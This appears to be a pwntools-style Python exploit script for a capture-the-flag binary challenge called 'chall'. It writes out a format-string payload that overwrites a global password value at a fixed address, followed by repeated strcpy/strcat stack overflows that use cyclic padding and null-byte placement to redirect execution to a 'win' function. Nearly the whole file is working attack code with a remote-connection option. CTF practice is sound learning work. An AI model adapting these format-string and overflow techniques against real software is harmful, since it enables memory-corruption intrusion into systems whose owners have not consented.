#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*main+238
b*main+279
b*main+316
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

'''
The strcat() function appends the src string to the dest string, overwriting the terminating null byte ('\0') at the end of dest and then adds a terminating null byte.
'''

'''
[*] '/home/alter/CTFs/VSL/Interesting_Functions/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''

def exploit():

    # 1. strcpy
    # 2. strcat
    # 3. printf

    # Change pwd value
    pl = f'%{0x1337}c%9$n'.encode()
    pl = pl.ljust(0x17, b'A')
    pl += p64(0x4041c0) # pwd

    sla(b'> ', b'1')
    sla(b'data: ', pl)
    sla(b'> ', b'3')

  # Buffer Overflow
  # Add NULL byte at the end of the first time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = (cyclic_find(b'gaaa') + 2)*b'B' + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Add NULL byte at the end second time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = (cyclic_find(b'gaaa') + 1)*b'C' + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Add NULL byte at the end third time
    pl = cyclic(255)
    sla(b'> ', b'1')
    sla(b'data: ', pl)

    pl = cyclic(cyclic_find(b'gaaa')) + p64(exe.sym.win)
    sla(b'> ', b'2')
    sla(b'data: ', pl)

  # Break the loop and return to win
    sla(b'> ', b'4')

    interactive()

if __name__ == '__main__':
    exploit()
